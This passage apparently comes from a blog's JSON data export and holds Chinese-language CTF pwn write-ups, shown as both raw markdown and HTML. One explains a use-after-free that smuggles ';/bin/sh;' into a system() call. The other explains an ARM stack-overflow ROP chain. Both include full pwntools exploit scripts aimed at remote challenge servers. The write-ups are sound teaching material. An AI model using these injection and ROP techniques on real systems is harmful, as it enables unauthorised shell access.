import*\nelf=ELF(\"./formatter\")\ncontext.log_level='debug'\n#p=process(\"./formatter\")\np=remote('111.200.241.244',57516)\n\ndef set_format(fmt):\n    p.recvuntil('> ')\n    p.sendline('1')\n    p.recv()\n    p.sendline(fmt)\n\ndef set_zone(zone):\n    p.recvuntil('> ')\n    p.sendline('3')\n    p.recv()\n    p.sendline(zone)\n\ndef print_time():\n    p.recvuntil('> ')\n    p.sendline('4')\n    #gdb.attach(p)\n    p.interactive()\n\ndef my_exit():\n    p.recvuntil('> ')\n    p.sendline('5')\n    p.recv()\n    p.sendline('n')\n\n\nset_format(\"aaaaaaaaaaa\")\nmy_exit()\nset_zone(\"';/bin/sh;'\")\nprint_time()\n\n```\n\n","source":"_posts/time_formatter.md","raw":"---\ntitle: Time formatter\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n---\n\n这应该算是一道堆题罢(doge)，虽然只是个非常简单的UAF\n\n<!--more-->\n\n首先查壳\n\n![protect](./time_formatter/protect.png)\n\n有个FORTIFY_SOURCE的对格式化字符串的保护\n\n1. 包含%n的格式化字符串不能位于程序内存中的可写地址。\n\n2. 当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。\n\n扔进ida看看源码，又是菜单,看代码改函数名弄到想吐\n\n简单解释一下这个程序的功能：\n- set_format():会用strdup申请一个chunk来存放输入的字符串，之后会对进行字符串中的字符进行检查（只能有字母、%、空格、：、#、-、_、0、/、^），不满足条件则会被free掉，**若满足，则会将chunk指针赋值给一个bss段中的变量ptr**\n- set_time():把你的输入写到一个固定的地方(没用)\n- set_zone():会用strdup申请一个chunk来存放输入的字符串，**但是不像set_format()那样进行检查**，chunk指针会赋值给value\n- print_time():如果ptr中有值，则会执行system(command)，command通过snprintf构造(**有漏洞**)\n- my_exit():先free了ptr和value，再问你是不是真的要退出，却并没有让ptr和value=>null，也没有清空其中的内容\n\n下面仔细看看值得注意的地方:\n\n**1.print_time()中command的构造**\n```c\n__snprintf_chk(command,2048LL,1LL,2048LL,\"/bin/date -d @%d +'%s'\",(unsigned int)dword_602120,(const char *)ptr);\n```\n这是什么东西?\n\n据说函数原型是这样的\n```c\nint snprintf(char *restrict buf, size_t n, const char * restrict  format[, arguement]);\n//str为要写入的字符串；n为要写入的字符的最大数目，超过n会被截断；format为格式化字符串,arguement为格式化字符串的参数\n```\n\n虽然不知道为什么2048LL后面有个1L,2048LL，但可以知道的是，ptr就是格式化字符串的第二个参数，其内容会写入%s处，因此如果可以在这里写入/bin/sh就可以执行system(\"/bin/sh\")了\n\n但是也没这么容易，还有一些坑：\n1. 前面已经有一条指令/bin/date ...了，要让shell执行ptr的指令（即一条语句执行两条指令），需要用到&&或;。由于&&需要前一条指令执行完才会执行第二条，而;则不需要，因此ptr中的内容要改为;/bin/sh\n2. 还有另一个坑，在格式化字符串中是'%s'，%s外面是单引号，而要执行system(\"/bin/sh\"),/bin/sh要在单引号外面，因此在前后加上单引号，并且为了不出错，后面也要加上一个;，最后变为';/bin/sh;'\n\n**2.set_format()和set_zone()**\n\nset_format()和set_zone()中都有一个函数strdup()\n```c\nextern char *strdup(char *s);\n//功 能: 将字符串拷贝到新建的位置处\n//strdup()在内部调用了malloc()为变量分配内存\n```\nset_format()可以将指针赋值给ptr;set_zone()可以将指针赋值给value\n\n除此之外，在set_format()中拷贝完字符串后，会对字符串内容进行检查\n```c\nstrcpy(accept, \"%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# \");// 字符只能在这个范围内\nv3 = __readfsqword(0x28u);\nreturn strspn(s, accept) == strlen(s);\n```\n这让我们不能直接通过set_format()将ptr指向';/bin/sh;'\n\n**但是在set_zone()中并没有安全检查**\n\n**3.my_exit()的迷之操作**\n\n在my_exit中会先free了ptr和value，再问你是否要退出,**但是在free之后,ptr和value没有指向null，也没有清空其中的内容，也就是存在UAF**\n\n利用过程：\n1. 通过set_format()存放一个字符串（chunk长度要和';/bin/sh;'一致）\n2. my_exit()实现free(ptr)\n3. 通过set_zone()将原来的chunk申请回来，并利用其不进行检查的特点，写入';/bin/sh;'\n4. 执行print_time()，getshell\n\n\nexp:\n```python\nfrom pwn import*\nelf=ELF(\"./formatter\")\ncontext.log_level='debug'\n#p=process(\"./formatter\")\np=remote('111.200.241.244',57516)\n\ndef set_format(fmt):\n    p.recvuntil('> ')\n    p.sendline('1')\n    p.recv()\n    p.sendline(fmt)\n\ndef set_zone(zone):\n    p.recvuntil('> ')\n    p.sendline('3')\n    p.recv()\n    p.sendline(zone)\n\ndef print_time():\n    p.recvuntil('> ')\n    p.sendline('4')\n    #gdb.attach(p)\n    p.interactive()\n\ndef my_exit():\n    p.recvuntil('> ')\n    p.sendline('5')\n    p.recv()\n    p.sendline('n')\n\n\nset_format(\"aaaaaaaaaaa\")\nmy_exit()\nset_zone(\"';/bin/sh;'\")\nprint_time()\n\n```\n\n","slug":"time_formatter","published":1,"updated":"2023-01-02T15:58:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czago006h5oud8g3oczao","content":"<p>这应该算是一道堆题罢(doge)，虽然只是个非常简单的UAF</p>\n<span id=\"more\"></span>\n\n<p>首先查壳</p>\n<p><img src=\"./time_formatter/protect.png\" alt=\"protect\"></p>\n<p>有个FORTIFY_SOURCE的对格式化字符串的保护</p>\n<ol>\n<li><p>包含%n的格式化字符串不能位于程序内存中的可写地址。</p>\n</li>\n<li><p>当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</p>\n</li>\n</ol>\n<p>扔进ida看看源码，又是菜单,看代码改函数名弄到想吐</p>\n<p>简单解释一下这个程序的功能：</p>\n<ul>\n<li>set_format():会用strdup申请一个chunk来存放输入的字符串，之后会对进行字符串中的字符进行检查（只能有字母、%、空格、：、#、-、_、0、/、^），不满足条件则会被free掉，<strong>若满足，则会将chunk指针赋值给一个bss段中的变量ptr</strong></li>\n<li>set_time():把你的输入写到一个固定的地方(没用)</li>\n<li>set_zone():会用strdup申请一个chunk来存放输入的字符串，<strong>但是不像set_format()那样进行检查</strong>，chunk指针会赋值给value</li>\n<li>print_time():如果ptr中有值，则会执行system(command)，command通过snprintf构造(<strong>有漏洞</strong>)</li>\n<li>my_exit():先free了ptr和value，再问你是不是真的要退出，却并没有让ptr和value=&gt;null，也没有清空其中的内容</li>\n</ul>\n<p>下面仔细看看值得注意的地方:</p>\n<p><strong>1.print_time()中command的构造</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__snprintf_chk(command,<span class=\"number\">2048LL</span>,<span class=\"number\">1LL</span>,<span class=\"number\">2048LL</span>,<span class=\"string\">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>,(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)dword_602120,(<span class=\"type\">const</span> <span class=\"type\">char</span> *)ptr);</span><br></pre></td></tr></table></figure>\n<p>这是什么东西?</p>\n<p>据说函数原型是这样的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">snprintf</span><span class=\"params\">(<span class=\"type\">char</span> *<span class=\"keyword\">restrict</span> buf, <span class=\"type\">size_t</span> n, <span class=\"type\">const</span> <span class=\"type\">char</span> * <span class=\"keyword\">restrict</span>  format[, arguement])</span>;</span><br><span class=\"line\"><span class=\"comment\">//str为要写入的字符串；n为要写入的字符的最大数目，超过n会被截断；format为格式化字符串,arguement为格式化字符串的参数</span></span><br></pre></td></tr></table></figure>\n\n<p>虽然不知道为什么2048LL后面有个1L,2048LL，但可以知道的是，ptr就是格式化字符串的第二个参数，其内容会写入%s处，因此如果可以在这里写入/bin/sh就可以执行system(“/bin/sh”)了</p>\n<p>但是也没这么容易，还有一些坑：</p>\n<ol>\n<li>前面已经有一条指令/bin/date …了，要让shell执行ptr的指令（即一条语句执行两条指令），需要用到&amp;&amp;或;。由于&amp;&amp;需要前一条指令执行完才会执行第二条，而;则不需要，因此ptr中的内容要改为;/bin/sh</li>\n<li>还有另一个坑，在格式化字符串中是’%s’，%s外面是单引号，而要执行system(“/bin/sh”),/bin/sh要在单引号外面，因此在前后加上单引号，并且为了不出错，后面也要加上一个;，最后变为’;/bin/sh;’</li>\n</ol>\n<p><strong>2.set_format()和set_zone()</strong></p>\n<p>set_format()和set_zone()中都有一个函数strdup()</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">char</span> *<span class=\"title function_\">strdup</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span>;</span><br><span class=\"line\"><span class=\"comment\">//功 能: 将字符串拷贝到新建的位置处</span></span><br><span class=\"line\"><span class=\"comment\">//strdup()在内部调用了malloc()为变量分配内存</span></span><br></pre></td></tr></table></figure>\n<p>set_format()可以将指针赋值给ptr;set_zone()可以将指针赋值给value</p>\n<p>除此之外，在set_format()中拷贝完字符串后，会对字符串内容进行检查</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">strcpy</span>(accept, <span class=\"string\">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);<span class=\"comment\">// 字符只能在这个范围内</span></span><br><span class=\"line\">v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">strspn</span>(s, accept) == <span class=\"built_in\">strlen</span>(s);</span><br></pre></td></tr></table></figure>\n<p>这让我们不能直接通过set_format()将ptr指向’;/bin/sh;’</p>\n<p><strong>但是在set_zone()中并没有安全检查</strong></p>\n<p><strong>3.my_exit()的迷之操作</strong></p>\n<p>在my_exit中会先free了ptr和value，再问你是否要退出,<strong>但是在free之后,ptr和value没有指向null，也没有清空其中的内容，也就是存在UAF</strong></p>\n<p>利用过程：</p>\n<ol>\n<li>通过set_format()存放一个字符串（chunk长度要和’;/bin/sh;’一致）</li>\n<li>my_exit()实现free(ptr)</li>\n<li>通过set_zone()将原来的chunk申请回来，并利用其不进行检查的特点，写入’;/bin/sh;’</li>\n<li>执行print_time()，getshell</li>\n</ol>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./formatter&quot;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./formatter&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;111.200.241.244&#x27;</span>,<span class=\"number\">57516</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_format</span>(<span class=\"params\">fmt</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(fmt)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_zone</span>(<span class=\"params\">zone</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(zone)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_time</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">my_exit</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">set_format(<span class=\"string\">&quot;aaaaaaaaaaa&quot;</span>)</span><br><span class=\"line\">my_exit()</span><br><span class=\"line\">set_zone(<span class=\"string\">&quot;&#x27;;/bin/sh;&#x27;&quot;</span>)</span><br><span class=\"line\">print_time()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>这应该算是一道堆题罢(doge)，虽然只是个非常简单的UAF</p>","more":"<p>首先查壳</p>\n<p><img src=\"./time_formatter/protect.png\" alt=\"protect\"></p>\n<p>有个FORTIFY_SOURCE的对格式化字符串的保护</p>\n<ol>\n<li><p>包含%n的格式化字符串不能位于程序内存中的可写地址。</p>\n</li>\n<li><p>当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</p>\n</li>\n</ol>\n<p>扔进ida看看源码，又是菜单,看代码改函数名弄到想吐</p>\n<p>简单解释一下这个程序的功能：</p>\n<ul>\n<li>set_format():会用strdup申请一个chunk来存放输入的字符串，之后会对进行字符串中的字符进行检查（只能有字母、%、空格、：、#、-、_、0、/、^），不满足条件则会被free掉，<strong>若满足，则会将chunk指针赋值给一个bss段中的变量ptr</strong></li>\n<li>set_time():把你的输入写到一个固定的地方(没用)</li>\n<li>set_zone():会用strdup申请一个chunk来存放输入的字符串，<strong>但是不像set_format()那样进行检查</strong>，chunk指针会赋值给value</li>\n<li>print_time():如果ptr中有值，则会执行system(command)，command通过snprintf构造(<strong>有漏洞</strong>)</li>\n<li>my_exit():先free了ptr和value，再问你是不是真的要退出，却并没有让ptr和value=&gt;null，也没有清空其中的内容</li>\n</ul>\n<p>下面仔细看看值得注意的地方:</p>\n<p><strong>1.print_time()中command的构造</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__snprintf_chk(command,<span class=\"number\">2048LL</span>,<span class=\"number\">1LL</span>,<span class=\"number\">2048LL</span>,<span class=\"string\">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>,(<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)dword_602120,(<span class=\"type\">const</span> <span class=\"type\">char</span> *)ptr);</span><br></pre></td></tr></table></figure>\n<p>这是什么东西?</p>\n<p>据说函数原型是这样的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">snprintf</span><span class=\"params\">(<span class=\"type\">char</span> *<span class=\"keyword\">restrict</span> buf, <span class=\"type\">size_t</span> n, <span class=\"type\">const</span> <span class=\"type\">char</span> * <span class=\"keyword\">restrict</span>  format[, arguement])</span>;</span><br><span class=\"line\"><span class=\"comment\">//str为要写入的字符串；n为要写入的字符的最大数目，超过n会被截断；format为格式化字符串,arguement为格式化字符串的参数</span></span><br></pre></td></tr></table></figure>\n\n<p>虽然不知道为什么2048LL后面有个1L,2048LL，但可以知道的是，ptr就是格式化字符串的第二个参数，其内容会写入%s处，因此如果可以在这里写入/bin/sh就可以执行system(“/bin/sh”)了</p>\n<p>但是也没这么容易，还有一些坑：</p>\n<ol>\n<li>前面已经有一条指令/bin/date …了，要让shell执行ptr的指令（即一条语句执行两条指令），需要用到&amp;&amp;或;。由于&amp;&amp;需要前一条指令执行完才会执行第二条，而;则不需要，因此ptr中的内容要改为;/bin/sh</li>\n<li>还有另一个坑，在格式化字符串中是’%s’，%s外面是单引号，而要执行system(“/bin/sh”),/bin/sh要在单引号外面，因此在前后加上单引号，并且为了不出错，后面也要加上一个;，最后变为’;/bin/sh;’</li>\n</ol>\n<p><strong>2.set_format()和set_zone()</strong></p>\n<p>set_format()和set_zone()中都有一个函数strdup()</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">char</span> *<span class=\"title function_\">strdup</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span>;</span><br><span class=\"line\"><span class=\"comment\">//功 能: 将字符串拷贝到新建的位置处</span></span><br><span class=\"line\"><span class=\"comment\">//strdup()在内部调用了malloc()为变量分配内存</span></span><br></pre></td></tr></table></figure>\n<p>set_format()可以将指针赋值给ptr;set_zone()可以将指针赋值给value</p>\n<p>除此之外，在set_format()中拷贝完字符串后，会对字符串内容进行检查</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">strcpy</span>(accept, <span class=\"string\">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);<span class=\"comment\">// 字符只能在这个范围内</span></span><br><span class=\"line\">v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"built_in\">strspn</span>(s, accept) == <span class=\"built_in\">strlen</span>(s);</span><br></pre></td></tr></table></figure>\n<p>这让我们不能直接通过set_format()将ptr指向’;/bin/sh;’</p>\n<p><strong>但是在set_zone()中并没有安全检查</strong></p>\n<p><strong>3.my_exit()的迷之操作</strong></p>\n<p>在my_exit中会先free了ptr和value，再问你是否要退出,<strong>但是在free之后,ptr和value没有指向null，也没有清空其中的内容，也就是存在UAF</strong></p>\n<p>利用过程：</p>\n<ol>\n<li>通过set_format()存放一个字符串（chunk长度要和’;/bin/sh;’一致）</li>\n<li>my_exit()实现free(ptr)</li>\n<li>通过set_zone()将原来的chunk申请回来，并利用其不进行检查的特点，写入’;/bin/sh;’</li>\n<li>执行print_time()，getshell</li>\n</ol>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./formatter&quot;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./formatter&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;111.200.241.244&#x27;</span>,<span class=\"number\">57516</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_format</span>(<span class=\"params\">fmt</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(fmt)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">set_zone</span>(<span class=\"params\">zone</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(zone)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_time</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">my_exit</span>():</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    p.sendline(<span class=\"string\">&#x27;n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">set_format(<span class=\"string\">&quot;aaaaaaaaaaa&quot;</span>)</span><br><span class=\"line\">my_exit()</span><br><span class=\"line\">set_zone(<span class=\"string\">&quot;&#x27;;/bin/sh;&#x27;&quot;</span>)</span><br><span class=\"line\">print_time()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"typo","date":"2023-03-23T07:56:03.000Z","_content":"\narm pwn入门题，有`system`和`/bin/sh`，简单的栈溢出。\n<!-- more -->\n\n先checksec和file查下：\n\n```sh\n# 32位ARM，静态链接\ntypo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n\n# 只开了NX\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/typo'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8000)\n```\n\n逆向：\n\n有太多的sub了，很多函数需要靠猜。\n\n程序大概的功能就是不断随机读取单词表中的一个单词，如果输入与他一样则继续，否则告诉你`E.r.r.o.r`，输入`~`则结束，会告诉你准确率以及速度。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  void *v3; // r3\n  int v4; // r1\n  void *v5; // r2\n  void *v6; // r3\n  int v7; // r0\n  int v8; // r0\n  int correct; // r0\n  int v10; // r1\n  double v11; // r0\n  int v12; // r3\n  double v14; // [sp+8h] [bp-2Ch]\n  int v15; // [sp+10h] [bp-24h]\n  int v16; // [sp+14h] [bp-20h]\n  int idx; // [sp+18h] [bp-1Ch]\n  int v18; // [sp+1Ch] [bp-18h]\n  int v19; // [sp+20h] [bp-14h]\n  int v20; // [sp+24h] [bp-10h]\n\n  v20 = 0;\n  v19 = 0;\n  setbuf((unsigned int *)off_A1538, 0, 2);\n  setbuf((unsigned int *)off_A1534[0], 0, 2);\n  write(\n    (void *)1,\n    \"Let's Do Some Typing Exercise~\\nPress Enter to get start;\\nInput ~ if you want to quit\\n\",\n    (void *)0x56,\n    v3);\n  if ( getchar() != '\\n' )\n    exit(-1);\n  write((void *)1, \"------Begin------\", (void *)0x11, (void *)'\\n');\n  v7 = gettimeofday(0, v4, v5, v6);\n  sub_FE28(v7);\n  correct = ftime(v8);\n  v18 = correct;\n  do\n  {\n    ++v20;\n    idx = rand(correct, v10) % 4504;\n    printf(\"\\n%s\\n\", &aAbandon[20 * idx]);      // 从单词表中输出一个单词\n    correct = read_and_cmp((int)&aAbandon[20 * idx]);// 接收输入并与单词比较 漏洞在这\n    v16 = correct;\n    if ( !correct )                             // 输入的与输出的不一致则输出error\n    {\n      correct = puts((int)\"E.r.r.o.r.\");\n      ++v19;\n    }\n  }\n  while ( v16 != 2 );\n  v15 = ftime(correct);\n  LODWORD(v11) = sub_9428(v15 - v18);\n  v14 = v11 / 1000000.0;\n  write((void *)1, \"------END------\", (void *)0xF, (void *)COERCE_UNSIGNED_INT64(v11 / 1000000.0));\n  sub_11F80('\\n');\n  sub_8DF0(v20 - 1, v19, v14);\n  puts((int)\"Bye\");\n  return v12;\n}\n```\n\n重点关注接收输入并比较的函数`read_and_cmp`：\n\n```c\nint __fastcall sub_8D24(unsigned __int8 *a1)\n{\n  unsigned int len; // r0\n  int v2; // r4\n  char v6[112]; // [sp+Ch] [bp-70h] BYREF\n\n  memset(v6, 0, 100);\n  read(0, v6, (void *)0x200, v6);               // 类似read，读取0x200byte到v6，存在栈溢出\n  len = strlen(a1);\n  if ( !strcmp(a1, (unsigned __int8 *)v6, len) )\n  {\n    v2 = strlen(a1);\n    if ( v2 == strlen(v6) - 1 )\n      return 1;\n  }\n  if ( v6[0] == '~' )\n    return 2;                                   // 到这里才能跳出循环\n  return 0;\n}\n```\n\n到这里漏洞已经挺明显的了，存在栈溢出漏洞，而且程序中存在`system`和`/bin/sh`，覆盖返回地址执行`system(\"/bin/sh\")`就可以get shell了。\n\n但是`ARM`架构和`x86`架构有些不同，`ARM`栈结构不像`x86`那样有`bp`和`return_addr`垫在最下方，但也差不多。\n\n`ARM`使用`LR`寄存器（`R14`或`X30`）保存函数的返回地址，而为了能在该函数执行完后，知道上一层函数的返回地址，需要将其保存在栈上，在函数返回时更新`LR`寄存器的值，因此可以通过栈溢出覆盖这个值来控制`LR`。\n\n在进行`ROP`的时候`ARM`也有所不同，由于`POP`和`PUSH`可以对`LR`和`PC`进行操作，没有`ret`，因此控制`PC`控制程序的执行流。通常找的`gadget`后面都有对`pc`的控制，通过控制`PC`控制执行流即可。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='arm')\nfilename='typo'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\n# p=process([\"qemu-arm\", \"-g\", \"8888\", \"./typo\"])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('node4.buuoj.cn',28805)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \npop_ro_r4_pc=0x00020904\nsys_addr=0x000110B4\nbinsh_addr=0x0006C384\nr()\ns(b'\\n')\npayload=b'a'*112+p32(pop_ro_r4_pc)+p32(binsh_addr)*2+p32(sys_addr)\ns(payload)\n\nitr()\n```\n\n\n\n","source":"_posts/typo.md","raw":"---\ntitle: typo\ndate: 2023-03-23 15:56:03\ncategories: \n- pwn_wp\ntags: \n- pwn\n- arm\n- stackoverflow\n\n---\n\narm pwn入门题，有`system`和`/bin/sh`，简单的栈溢出。\n<!-- more -->\n\n先checksec和file查下：\n\n```sh\n# 32位ARM，静态链接\ntypo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n\n# 只开了NX\n[*] 